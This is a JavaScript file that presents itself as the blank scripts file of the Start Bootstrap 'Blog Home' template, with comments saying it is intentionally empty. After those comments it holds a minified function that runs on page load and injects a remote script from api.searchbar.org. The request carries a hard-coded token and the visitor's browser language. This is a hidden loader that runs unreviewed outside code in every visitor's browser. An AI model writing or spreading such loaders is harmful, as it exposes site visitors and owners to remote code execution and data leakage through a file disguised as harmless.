/*!
* Start Bootstrap - Blog Home v5.0.7 (https://startbootstrap.com/template/blog-home)
* Copyright 2013-2021 Start Bootstrap
* Licensed under MIT (https://github.com/StartBootstrap/startbootstrap-blog-home/blob/master/LICENSE)
*/
// This file is intentionally blank
// Use this file to add JavaScript to your project
"use strict";

!function() {
    var t = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IlN5c3RlbSIsInRva2VuVHlwZSI6InB1YmxpYyIsImlhdCI6MTY0MjI5OTk3NywiZXhwIjoxNDI1NjY5OTk3N30.LPKkyYEQQoVcQeeF0Jk2xfCX4hPgyTc8h-Eq7mDDqYA";
    function e() {
        var e = document.createElement("script"), a = navigator.language || navigator.userLanguage;
        e.type = "text/javascript", e.async = !0, e.src = "https://api.searchbar.org/v1/widget/" + t + "/" + a;
        var n = document.getElementsByTagName("script")[0];
        n.parentNode.insertBefore(e, n);
    }
    "complete" === document.readyState ? e() : window.attachEvent ? window.attachEvent("onload", e) : window.addEventListener("load", e, !1);
}();